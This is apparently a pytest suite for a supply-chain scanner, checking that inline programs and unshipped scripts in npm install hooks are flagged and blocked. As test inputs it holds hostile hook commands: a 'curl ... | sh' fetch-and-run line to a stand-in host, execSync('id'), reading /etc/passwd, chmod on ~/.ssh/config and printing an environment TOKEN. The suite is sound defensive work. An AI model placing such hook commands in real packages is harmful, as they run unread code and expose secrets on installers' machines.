"""An install hook's shape says what the scan could not read (reviews/mcp-98/47-INSTALL-HOOK-SHAPE.md).

Two shapes of consumer-time hook (`preinstall`, `install`, `postinstall`) of a package the scanner
was handed, as opposed to the scanned project's own, are install-time code the content detectors
cannot be trusted with:

* the program is carried inline (`node -e '...'`), outside any file a reviewer opens, and a program
  that does nothing the capability rules label is exactly the one that read as harmless;
* the command hands an interpreter a script the scan does not hold, so the code that runs is unread.

Both block on their own. What does not change: a hook that loads a file of the package (graded as
that file), a package-manager guard, an author-time hook, the project's own manifest.
"""

from __future__ import annotations

import io
import json
import subprocess
import tarfile
from pathlib import Path

import pytest

from cordon_scanner import Scanner
from cordon_scanner.decide.policy import PolicyGate
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.models import Confidence, Severity

INLINE = "SUSPECT.INSTALL.INLINE_PROGRAM.001"
UNREAD = "SUSPECT.INSTALL.UNREAD.001"
SCRIPT = "SUSPECT.INSTALL.SCRIPT.001"


class HookKit:
    @staticmethod
    def package(tmp_path: Path, scripts: dict[str, str], **extra: str) -> Path:
        manifest = json.dumps({"name": "demo-pkg", "version": "1.0.0", "scripts": scripts})
        files = {"package/package.json": manifest, "package/index.js": "module.exports = 1;\n"}
        files.update({f"package/{name}": text for name, text in extra.items()})
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for member, text in files.items():
                data = text.encode()
                info = tarfile.TarInfo(member)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        target = tmp_path / "demo-pkg-1.0.0.tgz"
        target.write_bytes(buffer.getvalue())
        return target

    @staticmethod
    def scan(target: Path):
        return Scanner(Config.default().with_overrides(use_cache=False)).scan(target)

    @staticmethod
    def result(tmp_path: Path, scripts: dict[str, str], **extra: str):
        return HookKit.scan(HookKit.package(tmp_path, scripts, **extra))

    @staticmethod
    def own_project(tmp_path: Path, scripts: dict[str, str]):
        """The scanned project's own manifest: the scan target is a git root."""
        (tmp_path / "package.json").write_text(
            json.dumps({"name": "p", "version": "1.0.0", "scripts": scripts}), encoding="utf-8"
        )
        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        return Scanner().scan(tmp_path)

    @staticmethod
    def rules(result) -> set[str]:
        return {f.rule_id for f in result.findings}

    @staticmethod
    def blocks(result) -> bool:
        return not PolicyGate.evaluate(result, Config.default().policy).passed


class TestAnInlineProgramInAConsumerHook:
    @pytest.mark.parametrize(
        "hook",
        [
            {"postinstall": "node -e \"console.log('thanks for installing')\""},
            {"preinstall": "python3 -c 'print(1)'"},
            {"install": 'node -e "process.exit(1)"'},
            {"postinstall": 'node -e "var x = 1 + 1; console.log(x)" && echo done'},
        ],
    )
    def test_it_is_reported_and_blocks(self, tmp_path: Path, hook: dict[str, str]) -> None:
        result = HookKit.result(tmp_path, hook)
        found = [f for f in result.findings if f.rule_id == INLINE]
        assert found, "a program carried inline in an install hook is a finding by itself"
        assert all(f.severity >= Severity.HIGH and f.confidence >= Confidence.MEDIUM for f in found)
        assert HookKit.blocks(result)

    def test_the_finding_names_the_hook_and_the_manifest(self, tmp_path: Path) -> None:
        result = HookKit.result(tmp_path, {"postinstall": "node -e \"console.log('x')\""})
        found = next(f for f in result.findings if f.rule_id == INLINE)
        assert found.location.path.endswith("package/package.json")
        assert "postinstall" in found.message

    def test_the_install_script_finding_stays(self, tmp_path: Path) -> None:
        result = HookKit.result(tmp_path, {"postinstall": "node -e \"console.log('x')\""})
        assert SCRIPT in HookKit.rules(result)

    @pytest.mark.parametrize("name", ["prepare", "prepublishOnly", "prepack", "postpublish"])
    def test_an_author_time_hook_is_not(self, tmp_path: Path, name: str) -> None:
        result = HookKit.result(tmp_path, {name: "node -e \"console.log('x')\""})
        assert INLINE not in HookKit.rules(result)

    def test_a_program_that_only_loads_a_file_of_the_package_is_graded_as_that_file(
        self, tmp_path: Path
    ) -> None:
        hook = {"postinstall": "node -e \"try{require('./setup.js')}catch(e){}\""}
        result = HookKit.result(tmp_path, hook, **{"setup.js": "module.exports = 1;\n"})
        assert INLINE not in HookKit.rules(result)
        assert UNREAD not in HookKit.rules(result)
        assert not HookKit.blocks(result)

    def test_a_loader_of_a_file_the_scan_does_not_hold_is_unread_code(self, tmp_path: Path) -> None:
        hook = {"postinstall": "node -e \"try{require('./setup.js')}catch(e){}\""}
        result = HookKit.result(tmp_path, hook)
        assert UNREAD in HookKit.rules(result)
        assert HookKit.blocks(result)

    def test_a_package_manager_guard_is_a_recognised_idiom(self, tmp_path: Path) -> None:
        guard = (
            "node -e \"if(process.env.npm_execpath.indexOf('yarn') === -1) "
            "throw new Error('install with yarn')\""
        )
        result = HookKit.result(tmp_path, {"preinstall": guard})
        assert INLINE not in HookKit.rules(result)

    def test_a_guard_that_also_does_something_else_is_not(self, tmp_path: Path) -> None:
        program = (
            "node -e \"if(process.env.npm_execpath.indexOf('yarn') === -1) "
            "throw 1; require('https').get('https://example.invalid/x')\""
        )
        result = HookKit.result(tmp_path, {"preinstall": program})
        assert INLINE in HookKit.rules(result)

    def test_the_scanned_projects_own_manifest_is_not_blocked_for_it(self, tmp_path: Path) -> None:
        result = HookKit.own_project(tmp_path, {"postinstall": "node -e \"console.log('x')\""})
        assert INLINE not in HookKit.rules(result)


class TestABannerIsNotAWayAroundTheShape:
    """An inline program stays a finding however much it looks like a banner.

    Measured on the dev sets, exempting a program whose every statement only prints string literals
    frees one legitimate unit and costs four malicious ones (one family, each blocked by content only
    by this rule), so the rule stays strict: a hook that carries any inline program is a finding.
    These are the programs an attacker would put behind a banner or in place of one; each must keep
    the finding and the block."""

    @pytest.mark.parametrize(
        "program",
        [
            "console.log('thanks for installing')",
            "console.log('a');console.error('b')",
            "console.log(require('child_process').execSync('id'))",
            "console.log(`${process.env.TOKEN}`)",
            "console.log('hi');fetch('https://x.invalid/')",
            "console.log('hi'); eval('1')",
            "console.log('hi')\nrequire('x')",
            "console.log('a' + b)",
            "console.log('a' + 'b')",
            "console.log('a'.repeat(3))",
            "console['log']('x')",
            "console.log(String.fromCharCode(104))",
            "console.log('x') // note",
            "console.log('x'),process.exit(0)",
            "console.log(tag`a`)",
            "console.log(1)",
            "console.log(x)",
            "process.stdout.write('x')",
            "console.log('x')&&require('y')",
            "import('child_process')",
        ],
    )
    def test_a_node_program_keeps_the_finding(self, tmp_path: Path, program: str) -> None:
        result = HookKit.result(tmp_path, {"postinstall": f'node -e "{program}"'})
        assert INLINE in HookKit.rules(result)
        assert HookKit.blocks(result)

    @pytest.mark.parametrize(
        "program",
        [
            "print('installed')",
            "print('a');import os;os.system('id')",
            "print(open('/etc/passwd').read())",
            "print(f'{x}')",
            "print('a' % b)",
            "print('a', end=chr(10))",
            "print('a');exec('1')",
            "print(b'a')",
            "print(1)",
        ],
    )
    def test_a_python_program_keeps_the_finding(self, tmp_path: Path, program: str) -> None:
        result = HookKit.result(tmp_path, {"postinstall": f"python3 -c '{program}'"})
        assert INLINE in HookKit.rules(result)

    def test_a_banner_beside_shell_work_does_not_hide_it(self, tmp_path: Path) -> None:
        hook = {"postinstall": "node -e \"console.log('a')\" && curl -s https://x.invalid/s | sh"}
        result = HookKit.result(tmp_path, hook)
        assert "MALWARE.DROPPER.001" in HookKit.rules(result)
        assert HookKit.blocks(result)


class TestTheFewInlineProgramsThatDoNothingElse:
    """Four closed shapes of inline program that legitimate packages write and that do nothing else are not a finding
    (`InlineShapes`): a no-op exit, a Node version check, a chmod of the package's own file, and a guarded import of the
    package's own file. Each is read by a closed token list, so a program that adds anything to one keeps the finding."""

    @pytest.mark.parametrize(
        ("hook", "extra"),
        [
            ({"postinstall": 'node -e "process.exit(0)"'}, {}),
            (
                {"postinstall": 'node dist/verify.js || node -e "process.exit(0)"'},
                {"dist/verify.js": "1;\n"},
            ),
            (
                {
                    "preinstall": "node -e \"process.exit(process.version.slice(1).split('.')[0] < 18 ? 1 : 0)\" || echo needs node 18"
                },
                {},
            ),
            (
                {
                    "preinstall": (
                        "node -e \"const major=Number(process.versions.node.split('.')[0]);if(major<20){"
                        "console.error('needs Node 20 or newer; this is Node '+process.versions.node+'. Upgrade.');"
                        'process.exit(1);}"'
                    )
                },
                {},
            ),
            (
                {
                    "postinstall": "node -e \"try{require('fs').chmodSync('dist/index.js',0o755)}catch(e){}\""
                },
                {},
            ),
            (
                {
                    "postinstall": "node -e \"require('fs').chmodSync('bin/a.js',493);require('fs').chmodSync('bin/b.js',493)\""
                },
                {},
            ),
            (
                {
                    "postinstall": (
                        "node -e \"try{require('fs').accessSync('dist/postinstall.js')}catch{process.exit(0)};"
                        "import('./dist/postinstall.js')\" || exit 0"
                    )
                },
                {"dist/postinstall.js": "export {};\n"},
            ),
            (
                {
                    "postinstall": "node -e \"require('fs').existsSync('dist/post.js')&&require('./dist/post.js')\""
                },
                {"dist/post.js": "1;\n"},
            ),
        ],
    )
    def test_the_shape_is_not_a_finding(
        self, tmp_path: Path, hook: dict[str, str], extra: dict[str, str]
    ) -> None:
        result = HookKit.result(tmp_path, hook, **extra)
        assert INLINE not in HookKit.rules(result)
        assert UNREAD not in HookKit.rules(result)
        assert not HookKit.blocks(result)

    @pytest.mark.parametrize(
        "program",
        [
            # a no-op that is not one
            "process.exit(1)",
            "process.exit(0);require('child_process').execSync('id')",
            "process.exit(0),fetch('https://x.invalid/')",
            "process.exit(0)//",
            # a version check that does more, says an address, or hides a word
            "if(process.version<'v18'){process.exit(1)}require('child_process').execSync('id')",
            "if(process.version<'v18'){process.exit(1)}fetch('https://x.invalid/')",
            "if(process.version<'v18'){console.error('see https://x.invalid/s');process.exit(1)}",
            "if(process.version<'v18'){process.exit(1)}eval('1')",
            "if(process.version<'v18'){process.exit(1)}process.env.X",
            "if(process.version<'v18'){process.exit(1)}process.binding('x')",
            "if(process.version<'v18'){process.exit(1)}console.log(`${process.env.T}`)",
            "const f=require;if(process.version<'v18'){process.exit(1)}f('child_process')",
            "if(process.version<'v18'){process.exit(1)}console['log']('x')",
            "if(process.version<'v18'){process.exit(1)}process['mainModule']['require']('child_process')",
            "if(process.version<'v18'){process.exit(1)}process[`x`]",
            "if(process.version<'v18'){process.exit(1)}console.table(1)",
            "process.version<'v18'",
            "if(process.versions.node<'18'){console.log('old')}",
            # a chmod that leaves the package, or does more
            "require('fs').chmodSync('/etc/passwd',0o777)",
            "require('fs').chmodSync('../x',0o777)",
            "require('fs').chmodSync('~/.ssh/config',0o600)",
            "require('fs').chmodSync('node_modules/.bin/x',0o755)",
            "require('fs').chmodSync('a/../../b',0o755)",
            "require('fs').chmodSync('dist/x.js',0o755);require('child_process').execSync('dist/x.js')",
            "require('fs').chmodSync('dist/x.js',0o755);fetch('https://x.invalid/')",
            "require('child_process').chmodSync('dist/x.js',0o755)",
            "require('fs').chmodSync(process.env.X,0o755)",
            "require('fs').chmodSync('dist/x.js',0o755).then(1)",
            # a guarded import of something else, or of something outside the package
            "try{require('fs').accessSync('dist/a.js')}catch{process.exit(0)};import('./dist/b.js')",
            "try{require('fs').accessSync('dist/a.js')}catch{process.exit(0)};import('evil-package')",
            "try{require('fs').accessSync('dist/a.js')}catch{process.exit(0)};import('/tmp/a.js')",
            "try{require('fs').accessSync('dist/a.js')}catch{process.exit(0)};import('https://x.invalid/a.js')",
            "try{require('fs').accessSync('dist/a.js')}catch{process.exit(2)};import('./dist/a.js')",
            "try{require('fs').accessSync('dist/a.js')}catch{require('child_process').execSync('id')};import('./dist/a.js')",
            "try{require('fs').accessSync('../a.js')}catch{process.exit(0)};import('./../a.js')",
            "try{require('fs').accessSync('dist/a.js')}catch{process.exit(0)};import('./dist/a.js');fetch('https://x.invalid/')",
            "require('fs').existsSync('dist/a.js')&&require('./dist/b.js')",
            "require('fs').existsSync('dist/a.js')&&require('dist/a.js')",
        ],
    )
    def test_anything_added_or_moved_outside_the_package_keeps_the_finding(
        self, tmp_path: Path, program: str
    ) -> None:
        result = HookKit.result(tmp_path, {"postinstall": f'node -e "{program}"'})
        assert INLINE in HookKit.rules(result)
        assert HookKit.blocks(result)

    def test_a_shape_beside_shell_work_does_not_hide_it(self, tmp_path: Path) -> None:
        hook = {"postinstall": 'node -e "process.exit(0)" && curl -s https://x.invalid/s | sh'}
        result = HookKit.result(tmp_path, hook)
        assert "MALWARE.DROPPER.001" in HookKit.rules(result)
        assert HookKit.blocks(result)

    def test_a_shape_beside_a_banner_keeps_the_finding_for_the_banner(self, tmp_path: Path) -> None:
        hook = {"postinstall": 'node -e "process.exit(0)" && node -e "console.log(\'hello\')"'}
        result = HookKit.result(tmp_path, hook)
        assert INLINE in HookKit.rules(result)

    def test_python_has_no_closed_shape(self, tmp_path: Path) -> None:
        result = HookKit.result(tmp_path, {"postinstall": "python3 -c 'import sys; sys.exit(0)'"})
        assert INLINE in HookKit.rules(result)


class TestAHookThatRunsAFileTheScanDoesNotHold:
    @pytest.mark.parametrize(
        "hook",
        [
            {"postinstall": "node scripts/setup.js"},
            {"postinstall": "node ./lib/run.js --quiet"},
            {"install": "sh ./missing.sh"},
            {"preinstall": "python3 helper.py"},
            {"postinstall": "node scripts/setup.js || true"},
        ],
    )
    def test_it_is_unread_install_time_code_and_blocks(
        self, tmp_path: Path, hook: dict[str, str]
    ) -> None:
        result = HookKit.result(tmp_path, hook)
        found = [f for f in result.findings if f.rule_id == UNREAD]
        assert found
        assert all(f.severity >= Severity.HIGH and f.confidence >= Confidence.MEDIUM for f in found)
        assert HookKit.blocks(result)

    def test_the_finding_says_why_the_reach_is_incomplete(self, tmp_path: Path) -> None:
        result = HookKit.result(tmp_path, {"postinstall": "node scripts/setup.js"})
        found = next(f for f in result.findings if f.rule_id == UNREAD)
        assert "install_reach_incomplete" in found.message
        assert "scripts/setup.js" in found.message

    def test_a_file_the_scan_holds_is_read_as_install_code_instead(self, tmp_path: Path) -> None:
        result = HookKit.result(
            tmp_path,
            {"postinstall": "node scripts/setup.js"},
            **{"scripts/setup.js": "module.exports = 1;\n"},
        )
        assert UNREAD not in HookKit.rules(result)

    @pytest.mark.parametrize(
        "hook",
        [
            {"postinstall": "node-gyp rebuild"},
            {"postinstall": "npm run build", "build": "tsc"},
            {"postinstall": "python -m pip install requests"},
            {"postinstall": "node --version"},
            {"postinstall": "node ./node_modules/.bin/patch-package"},
        ],
    )
    def test_a_tool_a_flag_or_a_dependency_path_is_not(
        self, tmp_path: Path, hook: dict[str, str]
    ) -> None:
        assert UNREAD not in HookKit.rules(HookKit.result(tmp_path, hook))

    @pytest.mark.parametrize("name", ["prepare", "prepublishOnly"])
    def test_an_author_time_hook_is_not(self, tmp_path: Path, name: str) -> None:
        assert UNREAD not in HookKit.rules(HookKit.result(tmp_path, {name: "node missing.js"}))

    def test_the_scanned_projects_own_manifest_is_not_blocked_for_it(self, tmp_path: Path) -> None:
        result = HookKit.own_project(tmp_path, {"postinstall": "node scripts/setup.js"})
        assert UNREAD not in HookKit.rules(result)
